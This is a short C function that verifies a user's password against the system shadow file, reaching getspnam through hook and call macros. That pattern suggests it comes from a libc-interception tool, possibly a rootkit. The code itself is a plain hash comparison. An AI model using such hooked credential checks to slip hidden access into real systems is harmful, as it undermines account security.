int verify_pass(char *user, char *acc_pass){
    struct spwd *ent;
    char *pass;
    int got_pw;

    hook(CGETSPNAM);
    ent = call(CGETSPNAM, user);
    if(ent == NULL || strlen(ent->sp_pwdp) < 2)
        return 0;

    pass = crypt(acc_pass, ent->sp_pwdp);
    if(pass == NULL) return 0;

    got_pw = !strcmp(pass, ent->sp_pwdp);
    if(got_pw) return 1;

    return 0;
}
